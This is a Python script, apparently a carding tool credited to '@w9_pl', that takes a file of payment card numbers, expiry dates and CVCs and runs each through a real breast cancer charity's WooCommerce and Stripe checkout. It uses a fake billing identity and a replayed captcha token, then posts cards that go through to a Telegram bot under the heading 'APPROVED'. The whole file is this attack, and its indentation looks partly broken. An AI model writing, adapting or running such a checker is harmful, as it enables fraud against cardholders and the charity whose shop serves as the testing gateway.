import requests,random,string,bs4,base64
from bs4 import *
import time,uuid,json,re



O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
Z =  '\033[1;37m' #kwhite
F = '\033[1;32m' #Green
B = '\033[2;36m' #Light Blue
X = '\033[1;33m' #Yellow
C = '\033[2;35m' #Purple
print(X+'________________________________________________')
print(Z+'''\nCheker Stripe Charge 13$ | Dev:@w9_pl''')
print(X+'________________________________________________')
file = input(B+'YOUR FILE CC NAME : ')
tokbot = input('TOKEN YOUR BOT : ')
idbot = input('ID : ')
file=open(file,"+r")
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')		
	
	r=requests.Session()
	
	headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://breastcancerresearch.ie',
    'priority': 'u=1, i',
    'referer': 'https://breastcancerresearch.ie/shop/',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
	
	params = {
	    'wc-ajax': 'add_to_cart',
	}
	
	data = {
    'product_sku': '',
    'product_id': '8411',
    'quantity': '1',
}
	
	response = r.post('https://breastcancerresearch.ie/', params=params, headers=headers, data=data)
	
	
	
	headers = {
    'Referer': 'https://breastcancerresearch.ie/shop/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
	
	res = r.get('https://breastcancerresearch.ie/checkout/', headers=headers)
	soup = BeautifulSoup(res.text, "html.parser")
	noncei = soup.find("input", id="woocommerce-process-checkout-nonce")
	nonce = noncei['value']
	alii = re.search(r'"key"\s*:\s*"([^"]+)"', res.text).group(1)
	
	
	
	headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
}
	
	data = f'billing_details[name]=%E2%80%AAMohammed+Saeed%E2%80%AC%E2%80%8F&billing_details[email]=testbin180copra%40gmail.com&billing_details[phone]=13342379842&billing_details[address][city]=Missouri+City&billing_details[address][country]=IE&billing_details[address][line1]=78+Old+Woods+Passage&billing_details[address][line2]=&billing_details[address][postal_code]=77459&billing_details[address][state]=CN&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2F13f5e7dcb8%3B+stripe-js-v3%2F13f5e7dcb8%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbreastcancerresearch.ie&time_on_page=102010&client_attribution_metadata[client_session_id]=69d9d031-bf74-4968-ba63-693947b8f2ed&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=bb5a58a7-53d6-4c50-b13b-7366c9ed0926&guid=4ac9a8ba-07c1-4533-a2f8-57e14b1dd23f4429e2&muid=882ebe1e-6271-4796-bb4a-c79abef4f5000241a7&sid=a9506642-9140-443d-8b79-d7bb2b54c5b9040567&key={alii}&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzU2Mzk4NTc4LCJjZGF0YSI6Ik1OdFhwdS9DZ3h6bmphVmhXVzJmN1FmWHdDV0ZwRTJ6NFFRRFFkOFNtcThLaDViWEE1VHhMaks1Z1lwcG5ReVBaOGUyME5PSzlCQmpsekRYVmUvellDOWR6N2VXbEg1K0wxZG45dElBZzdzTmRJaVJQdWdObkt4RTQ1US95aHRYM1h2TzdxR0l2ODlzWlVzOEFERXZvSzV1YjUydzVuMXVteUxIMllNYmszMEdPT3NmRUNuVHFxV2cyUm0weitMRWxvT3Rnc1NraWdxYkRxZDUiLCJwYXNza2V5IjoiWnkvSlIya2ZIVUJWK211R01MdFd3alhCakVPZE9KSXB2d0dKdzJtOUxkODFVUmI2WlUrU05XOHVRNE5RQmtTQzZxNTcwcUlYZG4zS2thc2ErZ3RFak1LTEVyRndHd01WUVl3QXU4dXozOHU2V251M2w0TW1wbS9oVVRnQXg3OEIyaEd4cGZhKzhvMEJnRVdwNjgxdzN2K1FrOGptYWNaNzZyM29QVHZhRklUMlBlM2pMRktIUnFrb3JMS0VNUDY2ejNzWkJ5emdwMHk2WFBuNWNKdTkrTGxubFIzTWhvQUhXVG9KL05uRzB5cmZLaHhjbGNGZkNhLzluRmpvV01vcmN3ZW5IYUlKb1NIWFdUSUdUcncwMGZWTzNXUEZ3c2VzY1Y3eWRRblluelMzS002UTg3NjJERHpTMzBDMGNaNDN1RVlPR0RJeGdXK2t6cncvQlFlbUdrUitnWGVGVkU3MUgxcVV5UDBLd1JWejYya1FJWHdMTmxuSHFsVThscWxlNVVNczJYTWJuVkRrazIwN0JvZkc5N0NXVnNZV2ZId1VZaUZreDgzNnFNaCtIcThJTjZyaUg2ZjVhcDIzaDRxNlNrTjVVakZ4bnNETWFobzhyVnBtL1YxMHAya1lJM2FzRXA3QXV1ZGxCYzB2b1RsbzFEQ0FOUG1Ud1c3NEZSRG5pZ0RnenFrWUxFNjlpRDA1ZWtGaWczUWtKRk1tK3hOZjc0NUJOMzA5K0szTTVWREJnQXkzSzQ2UjgveVgwUEZEZXVEWGRKbWFRYXRHd2I2U0lobyswMmp0eVdHdUhrMEZNUFpwZ2V5NE1FemVTUmsxUS9CZTFQOUFjY1RqUnlQOEtRUU1EcjZvVlk3RVN1bU1hOUw5bjlWcUhnRVNsODFMYWIvdFZHa0tvWHNtSU4ya3B0RHRXYjcwaTZuRDFUaUdMTWQwV3NUZ3dxQXJNSmpvU0JURm01QmtnQVUzeVVGb3FFUjVEcXg2SGxuSnVUWk94TjZlOUZ5Z2ttdDRMUlJCeGowYlQ4STNONXh1Q1FhWWhqanFqUTN2djVNcDY5RklUN2xzY0xKTFE1VjM3b0picWRWWVVVNG42WTBhMTZEckRBMVo4K1M3YmQyQXVxUk9qcVgzcXRNS0lXQmU3SCtkbFNNU1dXVFVjVTJvSm1rSVppS3VxK29HbE1KNEJNQm5jSFBTYlFWVitNYVVVOVp4Nm1qS3JXWmIxcFhQekhOSDROL1FVMmZ3SXEya0d4bkxHWlJqTTFzSTVQMVZjVFVMdFJQYmdMVzZqcTdTMHN1di96NUFQSW5LNnR2OGpvRjNJRG8wWGRRVlM2RFJNTUNyYVFlTkd6Z1htcE9ESkFla3grRUdFd3ZMRWk2VFk3R2NUVWhnck1GTUJEU1lLeXNYRk0zOFRqMUk1b04rSU12cXhtZ3lrS3gybzhEdm9VMHhSNUpCbDVXOXYrZEFVaDFoRlF2UktyeDB6OVB0dzV0OStmc0E2ekMzaGlJdGt2TGtTVlY3SS9tV1JjL2UyNDgwQ0FwcVNTNTJvUzBTb0Rad2l1Uk5HV255bFZZam9McjlES25RdWlDOFhObXlzUjZ4OGRhWWtoOU9GaWk3RUFySWdoWXNaZGxaU003Um1hSkM0WFE0OWg5Y1lheHYvRXZDcUxmUERtMU50bzhjYkFaK0UzUzFDdHNXeUtZWitMVmNNWFFUcHNpc0lRTGNPTklFUkdjMC9aVGtWWi9qV1FUeVFEb1BucFZpMXU5MWM1YUhEVUloTE0wcUdiMGtOT3hyYVBBbHZwaVZYblR1bmtpM2pqaFQ1NDlQVzFPZTVFazJ6TkVBa3k5WjQwMTVrSXduZDZjcjRJRUtqK1pMVXZDWWo4K2EzVjVsTkVDS1BicFA5ZloxRFprYTM5RjFZMDVDS0FYS3VyeVlGa09IZ0RJT0FialJwbFM2ZmZnN2NPRmx6OUNPMGRjMGRwWFoyc25OTG9ubU45aEs3MnNHL1pYTEw3RXhkQytoZHQ4Q0s3WC9kZHlENkRia3V6WG9yL2c0TXZXQlZOQmJnd0c4QmdMSGdZTytiSG0wcytidVladWwxSjdtVWQwZGZ1RmR6N2xVcjF0RWtseURUOE9jV2lmdWRLOC9BTmdERnFBWmRpQUxJYmxWazdRK2xPT2VHdHVXanNieElBY0ZocFYxNm5XdXZxT2ovNGwrNXJsRXVjbm9SQS85VjlGVEhkNUNYM1hUMkpDZ1RqeGJieEZBWlZ4V2JjMEZYRlpvQ050cWRwcFhRVUQxUlg1ZVhlSXhvQWF5SkxFTE01NEl1akdETXBieGRPa01jTDQ5NVZiK1BiZEp4bnpldk1zZWdydz0iLCJrciI6IjQzNDFlODdiIiwic2hhcmRfaWQiOjUzNTc2NTU5fQ.wJNqewADnxN4A9D_6yy3czRx-Wi28uaAUUE2BnI4Qu0'
	
	response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		print('Erorr ID')
	
	
	
	
	
	headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://breastcancerresearch.ie',
    'priority': 'u=1, i',
    'referer': 'https://breastcancerresearch.ie/checkout/',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
	
	params = {
	    'wc-ajax': 'checkout',
	}
	
	data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fbreastcancerresearch.ie%2F&wc_order_attribution_session_start_time=2025-08-28+16%3A22%3A28&wc_order_attribution_session_pages=8&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F139.0.0.0+Safari%2F537.36&billing_email=testbin180copra%40gmail.com&billing_first_name=%E2%80%AAMohammed&billing_last_name=Saeed%E2%80%AC%E2%80%8F&billing_company=&billing_country=IE&billing_address_1=78+Old+Woods+Passage&billing_address_2=&billing_city=Missouri+City&billing_state=CN&billing_postcode=77459&billing_phone=13342379842&createaccount=1&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=IE&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=G&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flat_rate%3A1&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method={id}'
	

	respons = r.post('https://breastcancerresearch.ie/', params=params, headers=headers, data=data).json()
try:
    soup = BeautifulSoup(respons['messages'], 'html.parser')
    message = soup.find('li').get_text(strip=True)
    msg = message.split(":", 1)[1].strip()
except:
    msg = ""   # نخليها فاضية لو مفيش رد

if 'success' in msg or 'Success' in msg or 'Successfully' in msg or 'Insufficient Funds' in msg:
    print(F + f'[{start_num}]', P, '|', 'Stripe Charge ✅ ')
    requests.post(
        f"https://api.telegram.org/bot{tokbot}/sendmessage",
        params={
            "chat_id": idbot,
            "text": f"""APPROVED ✅

[♡] 𝗖𝗖 : {P} 
[♕] 𝗚𝗔𝗧𝗘𝗦 : Stripe Charge
[♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : Charge 13$ ⚡
━━━━━━━━━━━━━━━━
[★] 𝗕𝘆 ⇾ 『@w9_pl』"""
        }
    )
else:
    print(O + f'[{start_num}]', P, '|', msg)


	
time.sleep(10)
		